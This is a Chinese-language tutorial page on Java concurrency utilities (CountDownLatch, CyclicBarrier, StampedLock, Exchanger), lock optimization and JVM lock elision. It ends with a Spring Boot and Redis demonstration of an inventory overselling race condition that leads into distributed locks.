<p>这样做的原因是，如果获取锁（<code>lock.lock()</code>）失败抛出了异常，那么在 <code>finally</code> 块中就无需（也不能）去释放这个锁。如果将 <code>lock.lock();</code> 写在 <code>try</code> 块内部，当获取锁抛出异常时，<code>finally</code> 块仍然会执行，这可能会导致尝试释放一个实际上并未被当前线程持有的锁，从而引发 <code>IllegalMonitorStateException</code>。</p>
<p>然而，需要注意的是，这种模式主要适用于 <code>lock.lock()</code> 不会抛出受检异常的情况。在 <code>java.util.concurrent.locks.Lock</code> 接口中，<code>lock()</code> 方法是不会抛出受检异常的。但如果你使用的锁实现可能会在 <code>lock()</code> 方法中抛出受检异常，那么你可能需要将 <code>lock()</code> 调用放入 <code>try</code> 块中，并在 <code>catch</code> 块中适当地处理异常。</p>
<h2 id="CountDownLatch"><a href="#CountDownLatch" class="headerlink" title="CountDownLatch"></a>CountDownLatch</h2><p>概念：</p>
<p><code>CountDownLatch</code>位于<code>java.util.concurrent</code>包中。<code>CountDownLatch</code>允许一个或多个线程等待其他线程完成一组操作。</p>
<p><code>CountDownLatch</code>是不能重用的，一旦计数器的值变为0，就不能再次将它重置回一个非零的值。</p>
<p>使用场景：</p>
<p>假设一个并发程序的主线程需要等待其他几个工作线程完成一组操作后才能继续执行。在这种情况下，我们可以使用<code>CountDownLatch</code>。</p>
<p>用法：</p>
<p>创建一个<code>CountDownLatch</code>的实例，将计数器的初始值设为工作线程的数量。每个工作线程完成任务后调用<code>countDown()</code>方法。主线程在开始任务前调用<code>await()</code>方法，然后等待所有的工作线程都完成任务。这里有一个简单的例子来说明<code>CountDownLatch</code>的使用：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.concurrent.CountDownLatch;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CountDownLatchDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">workerNum</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">CountDownLatch</span> <span class="hljs-variable">latch</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CountDownLatch</span>(workerNum);<br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; workerNum; i++) &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>                <span class="hljs-comment">// do some work</span><br>                System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot; finished work.&quot;</span>);<br>                latch.countDown();<br>            &#125;).start();<br>        &#125;<br><br>        latch.await();<br>        System.out.println(<span class="hljs-string">&quot;All workers have finished their jobs.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在这个例子中，创建一个了<code>CountDownLatch</code>的实例时，传递给它的构造函数的整数就是计数器的初始值。每个工作线程在完成任务后调用<code>countDown()</code>方法，每次调用这个方法都会将计数器的值减1。主线程在开始任务前调用<code>await()</code>方法，使主线程等待，然后等待计数器的值变为0，主线程继续执行，并输出一条消息。</p>
<h2 id="CyclicBarrier"><a href="#CyclicBarrier" class="headerlink" title="CyclicBarrier"></a>CyclicBarrier</h2><p><code>CyclicBarrier</code> 是 Java 并发编程中一种同步辅助工具，它允许一组线程互相等待，直到所有线程都到达某个公共的屏障点（Barrier Point）。</p>
<p>“Cyclic” 的含义是这个屏障点是可以重复利用的，也就是说，一旦所有等待线程都达到了屏障点，这个屏障就可以为下一轮的等待线程使用。</p>
<p>使用示例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.concurrent.CyclicBarrier;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CyclicBarrierDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">// 创建一个新的CyclicBarrier，当有3个线程达到时触发</span><br>        <span class="hljs-type">CyclicBarrier</span> <span class="hljs-variable">barrier</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CyclicBarrier</span>(<span class="hljs-number">3</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() &#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>                <span class="hljs-comment">// 所有线程到达屏障后执行此任务</span><br>                System.out.println(<span class="hljs-string">&quot;所有线程都到达了屏障点&quot;</span>);<br>            &#125;<br>        &#125;);<br><br>        <span class="hljs-comment">// 启动三个将在屏障处等待的线程</span><br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Task</span>(barrier), <span class="hljs-string">&quot;线程 1&quot;</span>);<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Task</span>(barrier), <span class="hljs-string">&quot;线程 2&quot;</span>);<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">t3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Task</span>(barrier), <span class="hljs-string">&quot;线程 3&quot;</span>);<br><br>        t1.start();<br>        t2.start();<br>        t3.start();<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Task</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Runnable</span> &#123;<br>        <span class="hljs-keyword">private</span> CyclicBarrier barrier;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">Task</span><span class="hljs-params">(CyclicBarrier barrier)</span> &#123;<br>            <span class="hljs-built_in">this</span>.barrier = barrier;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot; 在屏障处等待&quot;</span>);<br>                barrier.await();<br>                System.out.println(Thread.currentThread().getName() + <span class="hljs-string">&quot; 已经通过了屏障&quot;</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException ex) &#123;<br>                ex.printStackTrace();<br>            &#125; <span class="hljs-keyword">catch</span> (BrokenBarrierException ex) &#123;<br>                ex.printStackTrace();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<h2 id="ReadWriteLock"><a href="#ReadWriteLock" class="headerlink" title="ReadWriteLock"></a>ReadWriteLock</h2><p>ReadWriteLock，读写锁，</p>
<p>读写锁：</p>
<ul>
<li>共享锁（读锁）：读共享</li>
<li>排他锁（写锁）：写互斥</li>
</ul>
<p>由ReadWriteLock对象可以得到读锁和写锁</p>
<h2 id="StampedLock-1"><a href="#StampedLock-1" class="headerlink" title="StampedLock"></a>StampedLock</h2><p><code>StampedLock</code> 是 Java 在 JDK 8 中引入的一个新的同步工具类，用来解决某些场景下的并发问题。它设计的初衷是为了优化读多写少的场景，因此在读线程非常多，写线程非常少的情况下，<code>StampedLock</code> 提供了一种乐观读锁，可以使得多个线程同时读，大大提高了并发性能。</p>
<p><code>StampedLock</code> 提供的锁包括写锁、悲观读锁以及乐观读，这三种锁的释放和获取都是通过一个 <code>stamp</code>（邮票）变量来控制的，这个 <code>stamp</code> 变量类似于版本号，每次写锁的获取和释放都会导致 <code>stamp</code> 变化。</p>
<p>下面是一个使用 <code>StampedLock</code> 的例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Point</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> x, y;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StampedLock</span> <span class="hljs-variable">sl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StampedLock</span>();<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">move</span><span class="hljs-params">(<span class="hljs-type">double</span> deltaX, <span class="hljs-type">double</span> deltaY)</span> &#123; <span class="hljs-comment">// 移动点的位置</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> sl.writeLock(); <span class="hljs-comment">// 获取写锁</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            x += deltaX;<br>            y += deltaY;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            sl.unlockWrite(stamp); <span class="hljs-comment">// 释放写锁</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">double</span> <span class="hljs-title function_">distanceFromOrigin</span><span class="hljs-params">()</span> &#123; <span class="hljs-comment">// 计算从原点到现在位置的距离</span><br>        <span class="hljs-type">long</span> <span class="hljs-variable">stamp</span> <span class="hljs-operator">=</span> sl.tryOptimisticRead(); <span class="hljs-comment">// 尝试获取乐观读锁</span><br>        <span class="hljs-type">double</span> <span class="hljs-variable">currentX</span> <span class="hljs-operator">=</span> x, currentY = y;<br>        <span class="hljs-keyword">if</span> (!sl.validate(stamp)) &#123; <span class="hljs-comment">// 如果乐观读锁验证失败，改用悲观读锁</span><br>            stamp = sl.readLock();<br>            <span class="hljs-keyword">try</span> &#123;<br>                currentX = x;<br>                currentY = y;<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                sl.unlockRead(stamp); <span class="hljs-comment">// 释放悲观读锁</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> Math.sqrt(currentX * currentX + currentY * currentY);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在这个例子中，<code>move</code> 方法使用写锁，保证了数据的完整性，而 <code>distanceFromOrigin</code> 方法首先尝试获取乐观读锁，如果验证成功，则直接计算结果，否则改用悲观读锁。</p>
<p>需要注意的是，<code>StampedLock</code> 不支持重入和条件变量，使用时也要注意避免锁升级导致的死锁问题。此外，<code>StampedLock</code> 的锁方法不响应中断，如果需要支持中断，可以使用相应的 <code>xxxLockInterruptibly</code> 方法。</p>
<h2 id="Semaphore"><a href="#Semaphore" class="headerlink" title="Semaphore"></a>Semaphore</h2><p>信号量</p>
<p>用途：限流</p>
<h2 id="Exchanger"><a href="#Exchanger" class="headerlink" title="Exchanger"></a>Exchanger</h2><p>Exchanger 是 Java 并发包中提供的一个工具类，它用于在两个线程之间交换数据。Exchanger 提供了一个对外公开的 exchange() 方法，当一个线程调用该方法时，如果另一个线程已经调用了同一 Exchanger 对象的 exchange() 方法，则会导致两个线程相互阻塞，直到两个线程均完成数据的交换。</p>
<p>Exchanger 的主要特点如下：</p>
<ol>
<li><p>只支持两个线程之间的数据交换，不能用于多个线程之间的通信。</p>
</li>
<li><p>数据交换的过程是原子性的，即在一个线程完成数据交换之前，另一个线程无法访问交换的数据，保证了线程安全性。</p>
</li>
<li><p>如果一个线程先调用了 exchange() 方法，那么它会被阻塞等待另一个线程进行数据交换，避免了资源浪费和不必要的竞争。</p>
</li>
</ol>
<p>Exchanger 的使用场景比较广泛，例如可以用于实现两个线程之间的数据异步传递、多线程流水线处理等。在使用 Exchanger 时需要注意线程安全问题和数据的一致性问题，确保数据交换的正确性和可靠性。</p>
<p>下面是一个简单的示例，演示了两个线程之间通过 Exchanger 进行数据交换的过程：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.concurrent.Exchanger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ExchangerExample</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Exchanger&lt;String&gt; exchanger = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exchanger</span>&lt;&gt;();<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello from thread 1&quot;</span>;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> exchanger.exchange(data);<br>                System.out.println(<span class="hljs-string">&quot;Thread 1 got result: &quot;</span> + result);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;);<br>        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Hello from thread 2&quot;</span>;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> exchanger.exchange(data);<br>                System.out.println(<span class="hljs-string">&quot;Thread 2 got result: &quot;</span> + result);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br>        &#125;);<br>        t1.start();<br>        t2.start();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>输出结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Thread 1 got result: Hello from thread 2<br>Thread 2 got result: Hello from thread 1<br></code></pre></td></tr></table></figure>

<p>可以看到，两个线程之间成功进行了数据交换，并且获取到了对方传递的数据。</p>
<h2 id="Phaser"><a href="#Phaser" class="headerlink" title="Phaser"></a>Phaser</h2><p>略</p>
<h1 id="原子类"><a href="#原子类" class="headerlink" title="原子类"></a>原子类</h1><img src="./Java并发编程/image-20230517170045229.png" alt="image-20230517170045229" style="zoom:80%;" />

<h2 id="秒杀性能比较"><a href="#秒杀性能比较" class="headerlink" title="秒杀性能比较"></a>秒杀性能比较</h2><ul>
<li><p>synchronized</p>
</li>
<li><p>AtomicInteger</p>
<p>实现原理：基于CAS，使用了<code>Unsafe</code>类的一些函数来进行底层的原子性操作。</p>
<p>虽然<code>Unsafe</code>类可以进行一些不安全的操作，但在<code>AtomicInteger</code>中，它被用来实现线程安全的原子性操作。这是一个很好的例子，说明了工具本身并不决定结果，关键在于如何使用工具。</p>
</li>
<li><p>LongAdder</p>
<p>实现原理：分段锁，每个线程对应数组中的一个值，最后将值加和</p>
</li>
</ul>
<h1 id="锁优化方案"><a href="#锁优化方案" class="headerlink" title="锁优化方案"></a>锁优化方案</h1><h2 id="减小锁的范围"><a href="#减小锁的范围" class="headerlink" title="减小锁的范围"></a>减小锁的范围</h2><p>缩小锁的范围就是缩短持有锁的时间，减轻阻塞。</p>
<p>最简单的做法是将一些不会产生线程安全问题的代码移到同步代码块之外，比如把不会产生线程安全问题的I&#x2F;O类耗时的操作，放在同步代码块之外。</p>
<h2 id="减小锁的粒度"><a href="#减小锁的粒度" class="headerlink" title="减小锁的粒度"></a>减小锁的粒度</h2><p>减小锁的粒度就是缩小锁定对象的范围，就能够减少锁的竞争。</p>
<p>做法是把对大对象的加锁转换为对小对象的加锁，比如一个类中的多个方法都是对this加锁，按照减小锁粒度的思路就可以转换为只对每个方法中用到的临界区对象加锁。</p>
<h2 id="锁分离"><a href="#锁分离" class="headerlink" title="锁分离"></a>锁分离</h2><p>锁分离就是把锁拆分为读锁和写锁，规则是读读不互斥、读写和写写互斥</p>
<p>锁分离最典型的应用是ReadWriteLock（读&#x2F;写锁）</p>
<h2 id="锁分段"><a href="#锁分段" class="headerlink" title="锁分段"></a>锁分段</h2><p>锁分段就是对一组对象上的锁进行分解，以减小锁的粒度。</p>
<p>锁分段的典型应用是ConcurrentHashMap，ConcurrentHashMap将数据按照不同的数据段进行存储（使用了一个包含16个锁的数组），并为每一个数据段分配一把锁（第N个数据交给第N%16把锁保护）。</p>
<h2 id="避免热点区域"><a href="#避免热点区域" class="headerlink" title="避免热点区域"></a>避免热点区域</h2><p>避免热点区域是对热点区域（经常被访问的临界区）进行优化。</p>
<p>避免热点区域典型的应用是ConcurrentHashMap的size，ConcurrentHashMap会给每个数据段分别维护size，而不是共用一个size，这些size由所在数据段的锁来维护，减小了size改变的竞争频率，要统计size长度时，会累加数据段的size。</p>
<h2 id="使用独占锁的替换方案"><a href="#使用独占锁的替换方案" class="headerlink" title="使用独占锁的替换方案"></a>使用独占锁的替换方案</h2><p>要保证线程安全，还可以根据需要使用下面的方案替换独占锁：</p>
<ol>
<li>并发容器</li>
<li>读&#x2F;写锁</li>
<li>乐观锁（如使用了CAS操作的原子类）</li>
<li>final关键字修饰的不可变对象（final修饰的的变量是不可变的，不存在线程安全问题）</li>
</ol>
<h2 id="JVM自带的锁优化"><a href="#JVM自带的锁优化" class="headerlink" title="JVM自带的锁优化"></a>JVM自带的锁优化</h2><h3 id="锁消除"><a href="#锁消除" class="headerlink" title="锁消除"></a>锁消除</h3><p>锁消除的前提的JVM开启了逃逸分析，如果JVM通过逃逸分析发现对象只能被一个线程访问到，就可以不对这个对象加锁。即便程序中使用了同步锁，JVM也会将锁消除。</p>
<p>JVM参数：</p>
<ol>
<li>开启逃逸分析：-XX:+DoEscapeAnalysis</li>
<li>开启同步锁消除：-XX:+EliminateLocks</li>
</ol>
<p>如下代码，尽管StringBuffer的append()是被synchronized修饰的，但是不存在线程竞争，JVM会进行锁消除。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> String <span class="hljs-title function_">method</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();<br>    sb.append(<span class="hljs-string">&quot;1&quot;</span>);<span class="hljs-comment">//append()是被synchronized修饰的</span><br>    sb.append(<span class="hljs-string">&quot;2&quot;</span>);<br>    <span class="hljs-keyword">return</span> sb.toString();<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="锁粗化"><a href="#锁粗化" class="headerlink" title="锁粗化"></a>锁粗化</h3><p>由于锁的竞争和释放开销比较大，如果代码中对锁进行了频繁的竞争和释放，那么JVM会进行优化，将锁的范围适当扩大。</p>
<p>如下代码，在循环内使用synchronized，JVM锁粗化后，会将锁范围扩大到循环外。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i= <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>        <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>)&#123;<br>            ...<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>粗化后：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">synchronized</span> (<span class="hljs-built_in">this</span>)&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i= <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) &#123;<br>      		...      <br>    	&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>虽然JVM内部会进行优化，但是最好还是在代码里就优化了。</p>
<h1 id="分布式锁架构"><a href="#分布式锁架构" class="headerlink" title="分布式锁架构"></a>分布式锁架构</h1><h2 id="超卖问题"><a href="#超卖问题" class="headerlink" title="超卖问题"></a>超卖问题</h2><p>超卖问题的意思是系统售出的商品数量超出库存量，产生原因是多个线程同时拿到了同一商品的相同库存量，对同一商品的相同库存量进行了多次扣减。</p>
<p>下面给出模拟超卖问题的示例。</p>
<ol>
<li>使用SpringBoot和Redis搭建的会产生超卖问题的程序：</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@RequestMapping(&quot;/order/v1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OverSoldV1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCT_ID</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1001&quot;</span>;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">STOCK_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;100&quot;</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> Logger.getLogger(String.valueOf(OverSold.class));<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StringRedisTemplate stringRedisTemplate;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OverSold</span><span class="hljs-params">(StringRedisTemplate stringRedisTemplate)</span> &#123;<br>        <span class="hljs-built_in">this</span>.stringRedisTemplate = stringRedisTemplate;<br>        stringRedisTemplate.opsForValue().set(PRODUCT_ID, STOCK_COUNT);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/submitOrder&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">submitOrder</span><span class="hljs-params">()</span> &#123;<br>        <br>        <span class="hljs-type">String</span> <span class="hljs-variable">stockString</span> <span class="hljs-operator">=</span> stringRedisTemplate.opsForValue().get(PRODUCT_ID);<br>        <span class="hljs-keyword">if</span> (stockString == <span class="hljs-literal">null</span> || <span class="hljs-string">&quot;&quot;</span>.equals(stockString.trim())) &#123;<br>            logger.info(<span class="hljs-string">&quot;库存不足，扣减失败&quot;</span>);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;库存不足，扣减失败&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> Integer.parseInt(stockString);<br>        <span class="hljs-keyword">if</span> (stock &gt; <span class="hljs-number">0</span>) &#123;<br>            stock -= <span class="hljs-number">1</span>;<br>            stringRedisTemplate.opsForValue().set(PRODUCT_ID, String.valueOf(stock));<br>            <span class="hljs-type">String</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;库存扣减成功，当前库存为：&quot;</span> + stock;<br>            logger.info(info);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            logger.info(<span class="hljs-string">&quot;库存不足，扣减失败&quot;</span>);<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(<span class="hljs-string">&quot;库存不足，扣减失败&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<ol start="2">
<li><p>使用JMeter对接口进行并发测试，设置线程数为5，Ramp-up period是0，即5个线程会同时访问</p>
</li>
<li><p>运行JMeter测试任务，得到输出结果，可以看到存在对同一商品的相同库存进行了多次扣减的问题，即超卖问题。</p>
<p><img src="/./Java%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/image-20230521092117804.png" alt="image-20230521092117804"></p>
</li>
</ol>
<h2 id="分布式锁"><a href="#分布式锁" class="headerlink" title="分布式锁"></a>分布式锁</h2><h3 id="分布式锁的实现方式"><a href="#分布式锁的实现方式" class="headerlink" title="分布式锁的实现方式"></a>分布式锁的实现方式</h3><p>Java提供的锁机制都是JVM级别的，只在JVM进程内部有效。但是不能解决分布式场景下的高并发问题，要解决分布式环境下的高并发问题，需要使用分布式锁。</p>
<p>实现分布式锁可以参照JVM锁的实现方式，JVM中多个线程在访问临界区资源时，会到统一的地方检查程序的临界区是否已经加锁，JVM在统一的地方使用加锁状态来标记是否进行了加锁操作，这个统一的地方可以是保存加锁状态的服务。</p>
